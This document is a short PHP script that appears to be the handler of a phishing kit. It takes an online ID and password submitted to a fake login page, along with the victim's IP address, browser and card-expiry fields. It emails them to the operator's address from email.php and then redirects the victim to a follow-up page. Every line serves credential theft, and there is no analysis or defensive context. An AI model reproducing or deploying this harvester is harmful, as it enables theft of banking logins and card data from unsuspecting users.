<?php
$zabi = getenv("REMOTE_ADDR");
include('email.php');
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  WC  -------------\n";
$message .= "Onlineid : ".$_POST['1']."\n";
$message .= "Password : ".$_POST['2']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Mou Ad  ----------------------\n";
$cc = $_POST['ccn'];
$login = $_POST['1'];
$subject = "TK1 [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: TK1 <service>\r\n";
mail($email,$subject,$message,$headers);

header("Location: index2.php?email=$login");?>